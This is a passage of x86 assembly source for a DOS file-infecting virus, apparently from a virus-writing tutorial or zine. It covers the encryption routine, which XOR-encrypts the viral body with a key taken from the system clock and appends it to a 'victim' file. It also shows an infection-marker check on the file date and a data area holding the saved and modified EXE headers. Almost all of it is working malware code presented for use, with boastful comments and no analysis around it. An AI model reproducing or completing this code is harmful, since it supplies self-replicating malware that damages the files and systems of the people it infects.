   encrypt_virus:  push    es di bx ax  ; Push these onto the stack
           mov bx,ax        ; Move the new IP to BX

   get_day_time:   xor ah,ah        ; Get time of day in CX:DX
           int 1ah      ; You might be dumb enough
           test    dl,dl        ; to not to understand this
           jz  get_day_time     ; intends to be random :P

           mov [crypt_key],dl          ; Store decryption key
           pop ax              ; Restore new IP in AX
           add ax,(crypt_begin-virus_begin)    ; Add IP to offset of
           mov [crypt_offset],ax       ; crypt_begin and of
           add ax,(crypt_end-crypt_begin-01h)  ; crypt_end and store
           mov [crypt_offse_],ax       ; both in our code

           mov si,offset virus_begin  ; First of all, copy
           mov di,offset virus_end    ; virus decryptor to
           push    cs             ; the start of the
           pop es             ; encryption buffer,
           mov cx,decryptor_size      ; which is gonna be
           rep movsb              ; appended to the file

           mov si,offset crypt_begin  ; Now point to the
           mov cx,virus_size-2dh      ; start of the code
   pick_n_roll:    lodsb                  ; and encrypt it into
           xor al,dl              ; our temporal buffer
           neg dl             ; in order to get the
           stosb                  ; definitive generation
           loop    pick_n_roll        ; ready to be written

           pop bx di es         ; Restore registers
           mov ah,40h           ; And now, the magical
           mov cx,virus_size-1ch    ; moment... attachment ;)
           nop              ; Twelveth nop (?)
           mov dx,offset virus_end  ; Write our encrypted
           call    int21_simula         ; code to the end of
           ret              ; our victim and return

   ; ÄÄ´ Check infection marker ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   check_marker:   mov ax,es:[di+0fh]       ; Check if the file date
           cmp ah,64h           ; is equal to our marker
           ret              ; and return to caller

   ; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   initial_cs_ dw  ?        ; Initial CS relative to start of ...
   initial_ip_ dw  ?        ; Initial IP
   initial_ss  dw  ?        ; Initial SS relative to start of ...
   initial_sp  dw  ?        ; Initial SP

   decryptor_size  equ 11h      ; Temporal, decryptor size
   virus_size  equ 2244h        ; Temporal, virus size
   crypt_end   label   byte         ; End of encrypted code
   code_end    label   byte         ; End of viral code
           db  04h dup (?)
   exe_header  db  1ch dup (?)  ; Viral modified MZ header
   new_header  db  1ch dup (?)  ; Host original MZ header
   virus_end   label   byte         ; Absolute virus end
           db  (code_end-virus_begin) dup (?)
   data_end    label   byte         ; End of virus data

           end code_begin
